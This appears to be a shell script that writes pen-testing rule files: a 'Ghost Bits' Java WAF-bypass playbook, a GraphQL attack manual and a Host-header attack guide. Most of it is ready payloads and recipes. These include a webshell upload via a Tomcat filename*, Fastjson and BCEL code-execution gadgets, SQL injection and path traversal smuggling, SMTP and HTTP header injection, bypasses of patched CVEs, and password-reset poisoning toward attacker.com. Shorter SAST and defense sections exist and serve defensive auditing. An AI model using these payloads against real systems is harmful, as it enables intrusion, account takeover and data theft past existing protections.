| `\n`        | 0x0A | CRLF injection, log injection         | `瘊`       | U+760A     |
| `\r`        | 0x0D | CRLF injection, request smuggling     | `瘍`       | U+760D     |
| ` `         | 0x20 | header break, command separator       | `Ġ`        | U+0120     |
| `"`         | 0x22 | string break in JSON / quoted-printable | `Ģ`     | U+0122     |
| `%`         | 0x25 | URL encoding prefix, second decode    | `严`       | U+4E25     |
| `&`         | 0x26 | parameter separator                   | `Ȧ`        | U+0226     |
| `'`         | 0x27 | SQL string break                      | `ȧ`        | U+0227     |
| `(`         | 0x28 | EL/SpEL/OGNL syntax                   | `Ȩ`        | U+0228     |
| `)`         | 0x29 | EL/SpEL/OGNL syntax                   | `ȩ`        | U+0229     |
| `.`         | 0x2E | path traversal, extension             | `阮`       | U+962E     |
| `/`         | 0x2F | path separator                        | `丯`       | U+4E2F     |
| `0`         | 0x30 | hex digit construction                | `丰`       | U+4E30     |
| `1`         | 0x31 | hex digit construction                | `失`       | U+5931     |
| `2`         | 0x32 | hex digit construction                | `甲`       | U+7532     |
| `3`         | 0x33 | hex digit construction                | `耳`       | U+8033     |
| `;`         | 0x3B | command separator, header continuation | `Ȼ`       | U+023B     |
| `<`         | 0x3C | XSS / XML tag start                   | `ȼ`        | U+023C     |
| `=`         | 0x3D | parameter / header value              | `Ƚ`        | U+023D     |
| `>`         | 0x3E | XSS / XML tag end                     | `Ⱦ`        | U+023E     |
| `@`         | 0x40 | Fastjson `@type`, mail address        | `ŀ`        | U+0140     |
| `a`         | 0x61 | keyword `class`, alphabet             | `ᙡ`        | U+1661     |
| `c`         | 0x63 | keyword `class`, `cmd`                | `㹣`       | U+3E63     |
| `e`         | 0x65 | hex digit                             | `来`       | U+6765     |
| `j`         | 0x6A | extension `.jsp`                      | `陪`       | U+966A     |
| `l`         | 0x6C | keyword `class`, `closure`            | `౬`        | U+0C6C     |
| `n`         | 0x6E | keyword `Runtime`, `union`            | `陮`       | U+966E     |
| `s`         | 0x73 | keyword `class`, `select`             | `⑳`        | U+2473     |
| `t`         | 0x74 | keyword `Runtime`, `type`             | `Ŵ`        | U+0174     |
| `u`         | 0x75 | `\u` escape introducer                | `灵`       | U+7075     |

Workflow tip: keep the ASCII `Ŀ`, `ȧ`, `ȼ`, etc. variants for tight HTTP
header contexts (one byte UTF-8 expansion stays smaller); use CJK like `阮`,
`陪`, `严` when you want to bias the WAF "this is just text" classifier.

---

## 5. PER-COMPONENT PAYLOAD RECIPES

Every recipe shows the dual view: what the WAF inspects vs. what the backend
actually executes. This is the only reliable way to explain *why* the payload
goes through.

### 5.1 Tomcat `RFC2231Utility` — file upload Webshell (Family A)

Trigger: any endpoint that accepts multipart upload and Tomcat parses
`Content-Disposition: ... filename*=UTF-8''...`. Tomcat's RFC2231 decoder
casts each non-percent character directly to byte, dropping the high 8 bits.

Payload:

```
Content-Disposition: attachment; filename*=UTF-8''1.陪sp
```

| Stage                  | Filename it sees         |
|------------------------|--------------------------|
| WAF / extension filter | `1.陪sp` (not `.jsp`, allow) |
| Tomcat RFC2231 decoder | `陪` -> low byte 0x6A -> `j` |
| File system            | `1.jsp`                  |

Combine with traversal characters from section 4 (`阮`, `丯`) when the upload
target directory is fixed but the application accepts a `filename*`.

### 5.2 Apache Commons BCEL — ClassLoader RCE (Family A)

Trigger: any sink that resolves a class name through `BCEL` (`$$BCEL$$...`)
or any code that decodes BCEL via the `JavaReader` -> `ByteArrayOutputStream`
loop.

Vulnerable shape:

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();
JavaReader jr = new JavaReader(new CharArrayReader(userChars));
while ((ch = jr.read()) >= 0) {
    bos.write(ch);     // low 8 bits only
}
```

Attack: wrap each byte of the malicious BCEL bytecode into a Unicode
character whose low 8 bits equal that byte. The decoded byte stream is a
valid BCEL class; the WAF sees a long blob of CJK text without `$$BCEL$$`
keywords or class signatures.

| View | Content |
|------|---------|
| WAF  | `$$BCEL$$` followed by random looking CJK |
| BCEL | standard BCEL class file bytes → JVM defineClass → RCE |

Defense for blue team: a WAF inspecting BCEL must replicate the
`bos.write(ch)` semantics on each character before pattern matching.

### 5.3 Jackson `charToHex` — SQLi smuggling (Family C)

Trigger: any Jackson-parsed JSON field whose value is later embedded in SQL
or another parser. Jackson resolves `\uXXXX` digits via:

```java
private static final int[] sHexValues = new int[128];
public static int charToHex(int ch) {
    return sHexValues[ch & 0xFF];   // mask first, lookup second
}
```

Any non-ASCII character whose low 8 bits land on a populated index returns
that hex digit. The WAF sees gibberish; Jackson reconstructs an ASCII payload.

Payload (smuggle the digit `1` for a UNION column count):

```json
{"q": "\u丰丰耳失 union select 1,2,3 -- "}
```

| View    | Content                                             |
|---------|-----------------------------------------------------|
| WAF     | `\u丰丰耳失 union select ...` (no leading digit)    |
| Jackson | `\u0031 union select 1,2,3-- ` -> `1 union select…` |

Pair with [sqli-sql-injection](injection-test.md) for the
downstream UNION / boolean / time-based payload templates.

### 5.4 Fastjson — `\u` and `\x` escape bypass (Families B + C)

Two independent surfaces:

(a) `\u` escape — `Character.digit(c, 16)` accepts Unicode digit categories
beyond ASCII (Thai `๐-๙` U+0E50..U+0E59, Punjabi `੦-੯` U+0A66..U+0A6F,
fullwidth `０-９` U+FF10..U+FF19).

```json
{"\u４_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

WAF view: `\u４_type` (no `@type` literal). Fastjson normalizes fullwidth
`４` to `4`, then handles `_` via the `\x` shortcut below, yielding `@type`.

(b) `\x` escape — Fastjson computes `digits[x1] * 16 + digits[x2]`. An
illegal hex character returns the default value 0.

```
\x4_   ->   '4'(=4) * 16 + '_'(=0) = 0x40 = '@'
```

```json
{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

| View     | Field name |
|----------|------------|
| WAF      | `\x4_type` (not `@type`) |
| Fastjson | `@type` -> JdbcRowSetImpl autotype gadget triggers |

### 5.5 Spring / Jetty / Undertow / Vert.x — URL decoding (Families A + B)

Two combinable tricks:

Trick 1 — Family A character substitution in path or query:

```
/api/v1/data?file=阮丯阮丯etc丯passwd
                = ../../etc/passwd at the byte layer
```

Trick 2 — Family B `%2>` folding when Jetty's `TypeUtil.fromHexDigit` is in
the chain:

```
/setup/setup-s/%2>%2>/log.jsp
                = /setup/setup-s/../log.jsp after decode
```

Either alone bypasses most signature WAFs; combined they survive even
"normalized then matched" rules that only see ASCII percent triplets.

Spring CVE-2025-41242 chain (`StringUtils.uriDecode` patched in PR #34673):

```
input :  阮严灵丰丰甲来
       (.)(%)(u)(0)(0)(2)(e)
narrow:  .%u002e
decode:  ..
result:  arbitrary file read via path traversal
```

| Stage           | Path           |
|-----------------|----------------|
| Spring `isInvalidPath()` | `.%u002e` — no literal `..`, allow |
| Backend file resolution  | `..` after `%u002e` decode → traversal |

### 5.6 Angus Mail / Jakarta Mail — SMTP injection (Family A)

Trigger: any application that builds SMTP envelopes or headers from
user-controlled strings. Internal `ASCIIUtility` does:

```java
byte b = (byte) ch;           // 16-bit char silently narrowed
```

Smuggle CRLF as `瘍瘊`:

```
hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
```

| View | What it parses |
|------|----------------|
| Application validation | a single `From` value containing odd CJK |
| SMTP server            | five separate header lines + body, fully spoofed |

Real impact pattern: Jira-style (CVE-2025-57733) password-reset hijacking,
Confluence domain allowlist bypass — pair with
非邮件 CRLF 现场按协议打（`crlf-injection-test.md` 已收成一行）。

### 5.7 Apache HttpClient `<= 4.5.9` — request smuggling (Family A)

HTTPCLIENT-1974 / HTTPCLIENT-1978: header values pass through
`OutputStreamWriter` plus a narrow-cast write that emits raw `\r\n` for
`\u760D\u760A`.

```
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
```

| Hop | Sees |
|-----|------|
| Front proxy / WAF | one request with a long `X-Auth-Token` |
| Origin            | two requests; the second is an admin POST |

Cross-reference [request-smuggling](http-smuggling-test.md) for
chosen-prefix attacks once the desync is confirmed.

### 5.8 JDK HttpServer — response splitting (CVE-2026-21933, Family A)

Reflection of user input into a response header passes through
`com.sun.net.httpserver` writers that low-byte-cast each char.

Payload (URL parameter or upstream header):

```
Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

Server emits two logical responses; the second carries an attacker-chosen
body. Escalates to stored XSS, cache poisoning, and SSO redirect chains.

### 5.9 Other affected components

Same Family A primitive, different sink:

- **Lettuce (Redis client)** — command injection by smuggling `\r\n` into
  RESP frames; chain to arbitrary `CONFIG SET dir` + `SAVE` for SSRF-to-RCE.
- **Jodd `FileNameUtil`** — path traversal via `阮` and `丯` because its
  internal write loop narrows.
- **XMLWriter** — tag-name injection when an attribute or text node value is
  pushed through a low-byte writer; XXE / XSS pivot.
- **ActiveJ HTTP** — CRLF injection identical in shape to 5.7 / 5.8.
- **Vert.x HTTP body parser** — Family A in `MultipartParser`.

缺的 ASCII 字用公式 `chr((k<<8)|T)` 自己算（§1 / §3）；完整逐字节两套汉字表已砍。

---

## 6. KNOWN-CVE BYPASS RECIPES

Use these *exactly when the corresponding CVE is patched but a WAF still
fronts the service*. Each Payload below shifts the original ASCII attack into
a form that survives string-based WAF rules.

### Openfire CVE-2023-32315 — auth bypass (Family B)

Original public bypass:

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

Ghost Bits / `%2>` folding bypass (much harder to signature):

```
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
```

Each `%2>` collapses through Jetty's lax hex into `%2E` = `.`, yielding the
same `../../` traversal without ever emitting `..` or `%2e` to the WAF.

### GeoServer CVE-2024-36401 — RCE via `Runtime` keyword (Family B)

Public WAF rules typically block `Runtime`. Inject one folded character:

```
Ru%6>time
```

Decoder math: `%6>` -> `%6E` -> `n`. The expression evaluator now sees
`Runtime`, the WAF never did.

### Spring4Shell CVE-2022-22965 — class loader chain (Family A)

Required parameter prefix `class.module.classLoader...`. WAFs block the
literal `class`. Substitute via low-byte chars:

```
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader.resources..."
```

| Component | Char  | Code point | Low byte |
|-----------|-------|------------|----------|
| `c`       | `㹣`  | U+3E63     | 0x63     |
| `l`       | `౬`  | U+0C6C     | 0x6C     |
| `a`       | `ᙡ`  | U+1661     | 0x61     |
| `s`       | `⑳`  | U+2473     | 0x73     |
| `s`       | `⑳`  | U+2473     | 0x73     |

Springs's parameter-name resolver narrows back to `class`.

### Spring CVE-2025-41242 — arbitrary file read (Family A + Family B mix)

Already demonstrated in 5.5 above. Payload `阮严灵丰丰甲来` ->
`.%u002e` -> `..` after decode-after-validation.

### Jakarta Mail CVE-2025-57733 — Jira-style mail hijack (Family A)

```
to=victim@org.com瘍瘊Subject: Reset code瘍瘊To: attacker@evil.com瘍瘊瘍瘊Your code is 1234
```

The mail leaves the company SMTP server with valid SPF / DKIM / DMARC, but
its `To:` and `Subject:` are attacker-chosen — high-fidelity phishing.

---

## 7. DETECTION DECISION TREE

Use this when triaging a target. The point is to avoid Ghost Bits when it
cannot help and to *always* try it when the preconditions hold.

```
Is the backend Java? (Server header, error page, JSESSIONID, .do/.action,
                      WebGoat-style stack trace, X-Powered-By, X-Frame-Options
                      with Tomcat default values)
├── No  -> stop, Ghost Bits does not apply
└── Yes
    │
    ├── Is there a WAF / IDS or input filter blocking your literal payload?
    │   ├── No  -> use the literal payload; Ghost Bits is overkill
    │   └── Yes -> continue
    │
    ├── Which sink are you targeting?
    │   ├── File upload via multipart  -> recipe 5.1 (Tomcat filename*)
    │   ├── JSON deserialization       -> recipes 5.3 (Jackson) / 5.4 (Fastjson)
    │   ├── Class loader / BCEL ref    -> recipe 5.2
    │   ├── URL path / parameter       -> recipe 5.5 + Family B `%2>`
    │   ├── Header reflection          -> recipes 5.7 / 5.8
    │   ├── Mail send                  -> recipe 5.6
    │   └── Redis / RESP / XML / RPC   -> recipe 5.9
    │
    ├── Probe with a single non-destructive substitution first
    │   (replace ONE character with its Ghost variant; observe response
    │    diff: status code, length, header echo, error message, time)
    │
    └── If observable difference appears -> escalate by substituting all
                                            blocked characters and chain
                                            through the linked playbook.
```

---

## 8. SAST / CODE-AUDIT SIGNATURES

Three priority tiers when reviewing Java source. Search across all your
project repos, all dependencies you can shade, and the `lib/` of any
deployed appliance.

### Tier 1 — direct narrowing (Family A)

```
\(byte\)\s*\w+
&\s*0[xX][fF][fF]
&\s*255
\.write\(\s*[a-zA-Z_]\w*\s*\)         # OutputStream.write(int)
writeBytes\s*\(
StringBufferInputStream
String\.getBytes\s*\(\s*int
RandomAccessFile.*writeBytes
```

### Tier 2 — lax hex / digit decoding (Families B + C)

```
Character\.digit\s*\(
fromHexDigit
convertHexDigit
fromHex\s*\(
uriDecode
URLDecoder\.decode
sHexValues\[
& 0x1F\)\s*\+\s*\(.*>>.*\) \* 25
```

### Tier 3 — high-risk wrappers and reachability

```
RFC2231                # Tomcat / mail filename* parsing
JavaReader             # BCEL ClassLoader reachable
ASCIIUtility           # Jakarta Mail / Angus Mail
LineParser             # HttpClient header parser
ChunkedDecoder         # request smuggling adjacent
charToHex              # Jackson
encodeUTF8             # candidate for char->byte writer
```

Per-finding triage applies the **five-dimension risk model**:

| Dimension     | Higher risk if                                                     |
|---------------|--------------------------------------------------------------------|
| Input control | HTTP param, header, filename, JSON key, mail address               |
| Validation    | a deny/allow list runs *before* the narrowing site                 |
| Narrowing time | conversion happens after security check                           |
| Syntax target | result enters URL / SMTP / HTTP / Redis / file system / SQL grammar |
| Re-decoding   | Base64, URL-decode, JSON unescape, `%u`, etc. happen later         |

Risk formula:

```
attacker-controlled  +  check-before-narrow  +  result-in-protocol-syntax
                                              +  later-redecoding
                              = HIGH SEVERITY
```

---

## 9. DIFFERENTIAL TESTING WORKFLOW

A reproducible, black-box procedure to find new Ghost Bits sinks (red team)
or to validate a fix (blue team).

```
1. Pick one dangerous byte T at a time (e.g. 0x2E for '.').

2. Generate the candidate set:
       C = { chr((k << 8) | T) for k in 1..255 }
   Drop surrogates 0xD8XX..0xDFXX.

3. For each candidate c in C:
       a. Send a benign request with c at the chosen position.
       b. Send the same request with literal T at the same position.
       c. Compare four observables:
            - status code
            - response body length
            - response body content hash (or diff)
            - server-side log line (if available)

4. If any candidate produces a response equivalent to T but differs from a
   "neutral" character (e.g. 'X'), you have found a narrowing sink.

5. Repeat for the next T in your priority list:
       0x2E ('.'), 0x2F ('/'), 0x25 ('%'), 0x40 ('@'),
       0x0D ('\r'), 0x0A ('\n'), 0x6A ('j'), 0x73 ('s'),
       0x6C ('l'), 0x61 ('a'), 0x63 ('c'), 0x22 ('"'), 0x27 (''')

6. Cluster sinks by component (response Server header, error stack) — one
   sink usually implies the whole framework version is vulnerable.
```

This workflow is intentionally protocol-agnostic; the same loop works on a
file uploader, a search endpoint, a mail composer, or a Redis-backed cache.

---

## 10. DEFENSE AWARENESS

Five layers, all needed; any single one is bypassable in isolation.

| Layer            | Action                                                               |
|------------------|----------------------------------------------------------------------|
| Source code      | Ban hand-written `(byte) ch`, `& 0xFF`, `out.write(ch)`, `writeBytes`. Use `getBytes(StandardCharsets.UTF_8)` or strict ASCII allowlist for protocol fields. |
| Decoder          | Reject illegal input. Never default-fold an unknown hex / Unicode digit / Base64 character to 0 or to its low 8 bits. |
| Validation order | Always normalize first, then validate. Specifically: strict decode → Unicode NFC/NFKC → protocol normalize (URL `..` resolution, `File.getCanonicalPath`) → security check → execute. |
| Protocol field   | Use strict allowlists per field (HTTP header value, SMTP envelope, URL path, filename, JSON key, XML tag). Reject CR/LF in any header or address. |
| WAF / IDS        | Run a *multi-view* normalizer. Always inspect the original string AND the `(char) & 0xFF` view AND the URL-decoded view AND the Unicode-NFKC view. Alert when any view contains a dangerous semantic the original lacked. |

Blue-team smell tests:

- Logs contain CJK / Latin-Extended characters at positions where the
  protocol grammar expects ASCII (filename, header value, mail address).
- The HEX dump of a request contains bytes outside `0x20..0x7E` adjacent to
  protocol delimiters.
- A pen-test or scanner reports a "weird 200" that the security monitoring
  did not flag — Ghost Bits is the most common 2025-2026 cause for that
  pattern in Java stacks.

---

## 11. QUICK REFERENCE — KEY PAYLOADS

```text
# Ghost char generator
ghost(T, k) = chr(((k & 0xFF) << 8) | (T & 0xFF))     # avoid k in 0xD8..0xDF

# Tomcat filename* webshell upload
Content-Disposition: attachment; filename*="UTF-8''shell.陪sp"     # → shell.jsp

# BCEL ClassLoader bypass (concept)
$$BCEL$$<each-byte-of-class-file-wrapped-in-a-Unicode-char>

# Jackson SQLi smuggling
{"q":"\u丰丰耳失 union select 1,2,3-- "}                          # → "1 union select…"

# Fastjson @type smuggling
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}

# Spring URL decode + Jetty %2> folding
GET /api/data?file=阮丯阮丯etc丯passwd
GET /setup/setup-s/%2>%2>/log.jsp
GET /api?cmd=Ru%6>time

# Spring4Shell name* class smuggling
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader..."

# Spring CVE-2025-41242 path read
GET /resources/阮严灵丰丰甲来/secret.properties                    # → ../%u002e

# Angus Mail / Jira mail hijack
From: hacker@evil.com瘍瘊Subject: Reset瘍瘊To: victim@org.com瘍瘊瘍瘊Your code is 1234

# Apache HttpClient ≤4.5.9 smuggling
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1

# JDK HttpServer response splitting (CVE-2026-21933)
?ref=Cu瘍瘊Content-Type:text/html瘍瘊Content-Length:33瘍瘊瘍瘊<script>alert(1)</script>

# SAST first-pass grep
grep -RnE '\(byte\)\s*\w+|& 0[xX][fF][fF]|writeBytes|baos\.write\(\w+\)' src/
grep -RnE 'Character\.digit|fromHexDigit|charToHex|uriDecode' src/
```

---

## REFERENCES

- Black Hat Asia 2026 — *Cast Attack: A New Threat Posed by Ghost Bits in
  Java*. Speakers: Xinyu Bai (@b1u3r / @iSafeBlue), Zhihui Chen (@1ue).
  Contributor: Zongzheng Zheng (@chun_springX).
- Real-world CVEs re-enabled: GeoServer CVE-2024-36401, Spring4Shell
  CVE-2022-22965, Openfire CVE-2023-32315, Spring CVE-2025-41242, Jakarta
  Mail CVE-2025-57733, JDK HttpServer CVE-2026-21933, Apache HttpClient
  HTTPCLIENT-1974 / HTTPCLIENT-1978.
- Patched components to upgrade past: Apache Commons BCEL >= 6.12.0,
  Fastjson 2.x latest, Apache HttpClient >= 4.5.10 (or migrate to 5.x),
  GeoServer >= 2.28.3, Openfire >= 5.0.4. Confirm vendor advisories before
  relying on any single version number.


---
TECH_GHOST_BITS_CAST_TEST_EOF

seed_rule techniques/graphql-test.md <<'TECH_GRAPHQL_TEST_EOF'
> 结构：上半原有是主线；下半补充加深。短表没点名时按现场：自省 / 越权 id / 注入 / 批量。不必整篇通读。
>
> 写不写只认 `rules/srcskill/vuln-report-format.md`。Introspection 仅 schema、无敏感字段 → 继续挖字段/越权/注入。

## 一、原有知识库

# GraphQL 安全测试手册

## 一、GraphQL 识别

### 常见端点路径

```bash
# 标准路径
/graphql
/graphiql
/v1/graphql
/api/graphql
/query
/gql

# 检测方法
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}'

# 返回 {"data":{"__typename":"Query"}} → 确认是 GraphQL
```

---

## 二、Introspection 查询（Schema 泄露）

### 完整 Introspection Query

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

### 简化版 Introspection

```bash
# 获取所有类型
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# 获取所有查询
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name } } } }"}'

# 获取所有 mutation
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { mutationType { fields { name } } } }"}'
```

### 从 Schema 中挖掘信息

```
关注点:
1. 管理员专用 mutation: deleteUser, updateRole, banUser
2. 内部字段: isAdmin, internalId, secretToken
3. 隐藏查询: adminUsers, internalLogs, debugInfo
4. 敏感类型: CreditCard, BankAccount, PrivateMessage
```

---

## 三、越权测试

### 水平越权

```graphql
# 查询他人信息
query {
  user(id: "VICTIM_ID") {
    id
    email
    phone
    orders {
      id
      amount
    }
  }
}

# 修改他人数据（仅验证，不实际执行）
mutation {
  updateUser(id: "VICTIM_ID", input: {email: "attacker@evil.com"}) {
    id
    email
  }
}
```

### 垂直越权

```graphql
# 普通用户调用管理员 mutation
mutation {
  deleteUser(id: "TARGET_ID") {
    success
  }
}

mutation {
  promoteToAdmin(userId: "MY_ID") {
    user {
      id
      role
    }
  }
}
```

---

## 四、注入测试

### SQL 注入

```graphql
# 在参数中注入 SQL
query {
  user(id: "1' OR '1'='1") {
    id
    username
  }
}

query {
  searchUsers(keyword: "admin' UNION SELECT password FROM users--") {
    username
    email
  }
}
```

### NoSQL 注入

```graphql
# MongoDB 注入
query {
  user(id: "{\"$ne\": null}") {
    id
    username
  }
}
```

---

## 五、批量查询攻击

### Query Batching（绕过速率限制）

```bash
# 单次请求发送多个查询
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: \"1\") { email } }"},
    {"query": "{ user(id: \"2\") { email } }"},
    {"query": "{ user(id: \"3\") { email } }"},
    ...
    {"query": "{ user(id: \"1000\") { email } }"}
  ]'
```

### Alias 批量查询

```graphql
query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
  ...
  user1000: user(id: "1000") { email }
}
```

---

## 六、嵌套查询 DoS

```graphql
# 深度嵌套消耗服务器资源
query {
  user(id: "1") {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author {
                      id
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

# 循环引用 DoS
query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              id
            }
          }
        }
      }
    }
  }
}
```

---

## 七、字段建议利用

```bash
# 故意拼错字段名，利用 "Did you mean" 错误枚举字段
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { passwrd } }"}'

# 响应可能包含: "Did you mean: password, passwordHash?"
# 从而发现隐藏字段
```

---

## 八、CSRF 测试

### GET 请求 CSRF

```bash
# 部分 GraphQL 端点支持 GET 请求
curl "https://target.com/graphql?query={user(id:\"1\"){email}}"

# 如果支持 GET → 可构造 CSRF
<img src="https://target.com/graphql?query=mutation{deleteUser(id:\"1\"){success}}">
```

### Content-Type 绕过

```bash
# 尝试 text/plain 绕过 CORS 预检
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: text/plain" \
  -d '{"query": "mutation { deleteUser(id: \"1\") { success } }"}'
```

---

## 九、信息泄露

### 错误信息泄露

```graphql
# 触发错误获取内部信息
query {
  user(id: "invalid_id_format_to_trigger_error") {
    id
  }
}

# 响应可能包含:
# - 数据库错误（SQL 语句）
# - 内部路径（/var/www/app/...）
# - 框架版本
```

### 调试模式检测

```bash
# 检查是否开启调试模式
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { directives { name } } }"}'

# 如果返回 @debug, @internal 等指令 → 可能有调试功能
```

---

## 十、工具推荐

### graphw00f（指纹识别）

```bash
# 识别 GraphQL 引擎类型
pip3 install graphw00f
graphw00f -t https://target.com/graphql
```

### InQL（Burp 插件）

```
功能:
- 自动 Introspection
- 生成查询模板
- 批量测试
- 可视化 Schema

安装: Burp → Extender → BApp Store → InQL Scanner
```

### graphql-voyager（Schema 可视化）

```bash
# 在线工具
https://graphql-kit.com/graphql-voyager/

# 本地运行
npm install -g graphql-voyager
voyager --introspection schema.json
```

### 自动化测试脚本

```python
import requests
import json

url = "https://target.com/graphql"
headers = {"Content-Type": "application/json"}

# Introspection
introspection_query = '{"query": "{ __schema { types { name } } }"}'
r = requests.post(url, headers=headers, data=introspection_query)
schema = r.json()

# 提取所有类型
types = [t['name'] for t in schema['data']['__schema']['types']]
print(f"发现 {len(types)} 个类型:")
for t in types:
    if not t.startswith('__'):  # 过滤内置类型
        print(f"  - {t}")

# 批量 ID 枚举
for user_id in range(1, 101):
    query = f'{{"query": "{{ user(id: \\"{user_id}\\") {{ id email }} }}"}}'
    r = requests.post(url, headers=headers, data=query)
    if r.status_code == 200 and 'email' in r.text:
        print(f"用户 {user_id}: {r.json()}")
```

---

## 十一、防护检测

```bash
# 检测是否有查询深度限制
# 发送深度 20 的嵌套查询，观察是否被拦截

# 检测是否有查询复杂度限制
# 发送包含 100 个字段的查询

# 检测是否有速率限制
# 短时间内发送 100 次相同查询

# 检测是否禁用 Introspection
# 发送 __schema 查询，返回错误 → 已禁用
```

---

## 二、补充：graphql-and-hidden-parameters

### graphql-and-hidden-parameters

### GraphQL and Hidden Parameters — Introspection, Batching, and Undocumented Fields

## 1. GRAPHQL FIRST PASS

```graphql
query { __typename }
query {
  __schema {
    types { name }
  }
}
```

If introspection is restricted, continue with:

- field suggestions and error-based discovery
- known type probes like `__type(name: "User")`
- JS and mobile bundle route extraction

## 2. HIGH-VALUE GRAPHQL TESTS

| Theme | Example |
|---|---|
| IDOR | `user(id: "victim")` |
| batching | array of login or object fetch operations |
| hidden fields | admin-only fields exposed in type definitions |
| nested authz gaps | related object fields with weaker checks |

## 3. HIDDEN PARAMETER DISCOVERY

Look for:

- fields present in admin docs but not public docs
- `additionalProperties` or permissive schemas
- frontend code using richer request bodies than visible UI controls
- mobile endpoints carrying role, org, feature-flag, or internal filter fields

## 4. NEXT ROUTING

- If hidden fields affect privilege: [api authorization and bola](idor-test.md)
- If GraphQL batching changes auth or rate behavior: [api auth and jwt abuse](oauth-jwt-test.md)
- If endpoint discovery is incomplete: see `recon-methodology.md` and JS reverse (`js-reverse-guide.md`)
TECH_GRAPHQL_TEST_EOF

seed_rule techniques/hpp-test.md <<'TECH_HPP_TEST_EOF'
# hpp-test（几乎不交）

> HTTP 参数污染本身不交。污染导致越权/注入按那个洞写，走 `idor-test.md` / `injection-test.md`。
TECH_HPP_TEST_EOF

seed_rule techniques/http-host-header-test.md <<'TECH_HTTP_HOST_HEADER_TEST_EOF'
> 短表「Host 毒重置信」在 §2 下，用标题搜即可。有重置/激活口就打 Host / XFH（`rules/srcskill/dig-scope-workflow.md` §4.2.2），不必先看见邮件长什么样。没这类口，不要拿随机页空改 Host 来勾表。

# http-host-header

# HTTP Host Header Attacks — Injection & Routing Abuse


## 1. ATTACK SURFACE

The Host header is used by web applications and infrastructure for:

| Usage | Exploitation |
|---|---|
| URL generation (password reset links, email links) | Inject attacker domain → user clicks link to attacker |
| Virtual host routing | Spoof Host → access internal/admin vhost |
| Cache key component | Inject different Host → poison cache for all users |
| Reverse proxy routing | Host determines backend → SSRF to internal services |
| Access control decisions | Host-based ACLs can be bypassed |
| Canonical URL / SEO redirects | Host injection → open redirect |

---

## 2. PASSWORD RESET POISONING

### Host 毒重置信（短表有指针）

认：清单有重置 / 激活 / 邀请发信口（`rules/srcskill/dig-scope-workflow.md` §4.2.2）。不必先看见邮件里是不是用 Host 拼的。

打：

1. 对自己的号走一遍重置，看信里链接用的是不是请求里的 Host。
2. 再打一次，把 `Host` 改成协作域名。被 400/403 拦了，**Host 保持原站**，只加 `X-Forwarded-Host: 协作域`（很多框架只验 Host、拼链却吃 XFH）。
3. 还可试 `Host: 原站.协作域`、`Host: 原站:@协作域`、请求行绝对 URI。

算成：协作域收到带 token 的重置/激活链，拿到 token 能在**原站**换别人的密。只反射 Host、邮件不跟 → 没成。

假点：信里仍是原站；token 绑死本机会话点不开；只改了展示域名、点开还要原站验证码。单站没中不删短表这行。有重置口仍打 Host/XFH，不必先看到信。没这类口才不用拿随机页改 Host。

OAuth 变体：未登录授权地址口（`GetAuthorizationUrl` 一类）回包用 Host 拼 `redirect_uri`。改 Host 后打开官方身份页，仍 200 且 URL 里回调是外域 → 算成（登完码落到外域）。身份页拒外域 → 假点。XFH 本站无效也试。


The most common and impactful Host header attack.

### How It Works

```
1. Attacker requests password reset for victim@target.com
2. Attacker modifies Host header in the reset request:
   POST /forgot-password HTTP/1.1
   Host: attacker.com    ← injected
   
   email=victim@target.com

3. Server generates reset link using Host header value:
   "Click here to reset: https://attacker.com/reset?token=SECRET_TOKEN"

4. Victim receives email, clicks link → token sent to attacker
5. Attacker uses token on real target.com to reset password
```

### Testing

```http
POST /forgot-password HTTP/1.1
Host: attacker-collaborator.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

